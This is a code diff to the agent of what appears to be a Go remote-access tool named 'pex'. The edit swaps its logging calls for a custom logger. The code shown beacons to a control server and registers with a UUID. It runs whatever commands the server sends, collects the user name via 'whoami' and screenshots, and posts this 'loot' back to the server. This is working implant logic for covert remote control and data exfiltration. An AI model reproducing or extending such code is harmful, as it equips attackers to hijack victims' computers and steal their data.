@@ -3,7 +3,6 @@ package agent
 import (
 	"bytes"
 	"io"
-	"log/slog"
 	"math/rand/v2"
 	"net/http"
 	"os"
@@ -12,6 +11,7 @@ import (
 	"time"
 
 	"github.com/hardal7/pex/internal/config"
+	logger "github.com/hardal7/pex/internal/util"
 )
 
 func Serve() {
@@ -47,25 +47,25 @@ func makeRequest() {
 
 	response, err := http.DefaultClient.Do(request)
 	if err != nil {
-		slog.Info("Failed to send request to server: " + err.Error())
+		logger.Debug("Failed to send request to server: " + err.Error())
 		state.IsRegistered = false
 		return
 	} else {
-		slog.Info("Sent ping to server")
+		logger.Debug("Sent ping to server")
 	}
 
 	body, _ := io.ReadAll(response.Body)
 	if len(body) != 0 {
 		if state.IsRegistered == false {
 			state.UUID = string(body)
-			slog.Info("Registered to server with UUID: " + state.UUID)
+			logger.Info("Registered to server with UUID: " + state.UUID)
 			state.IsRegistered = true
 			return
 		}
 		command := strings.Fields(string(body[:]))
 		loot := runCommand(command)
 
-		slog.Info("Sending loot to server")
+		logger.Debug("Sending loot to server")
 		if loot.Kind == "Image" {
 			buffer, _ := os.ReadFile(loot.Content)
 			request, _ = http.NewRequest("POST", requestURL, bytes.NewBuffer(buffer))
@@ -79,18 +79,18 @@ func makeRequest() {
 
 		_, err := http.DefaultClient.Do(request)
 		if err != nil {
-			slog.Info("Failed sending loot to server: " + err.Error())
+			logger.Info("Failed sending loot to server: " + err.Error())
 		} else {
-			slog.Info("Sent loot to server")
+			logger.Info("Sent loot to server")
 		}
 	} else {
-		slog.Info("Received ping from server")
+		logger.Debug("Received ping from server")
 	}
 }
 
 func setHeaders(r http.Request) {
 	if state.Username == "" {
-		slog.Info("Getting username")
+		logger.Debug("Getting username")
 		state.Username = strings.TrimSpace(ExecuteCommand([]string{"whoami"}))
 	}
 	r.Header.Set("Username", state.Username)
@@ -112,7 +112,7 @@ func readKeys(request http.Request) {
 }
 
 func runCommand(command []string) Loot {
-	slog.Info("Executing command: " + command[0])
+	logger.Debug("Executing command: " + command[0])
 
 	var loot Loot
 	switch command[0] {
@@ -141,9 +141,9 @@ func runCommand(command []string) Loot {
 		loot.Content = screenshots[0]
 	default:
 		loot.Content = ExecuteCommand(command)
-		slog.Info("Output:\n" + loot.Content)
+		logger.Debug("Output:\n" + loot.Content)
 	}
-	slog.Info("Executed command")
+	logger.Info("Executed command")
 
 	return loot
 }
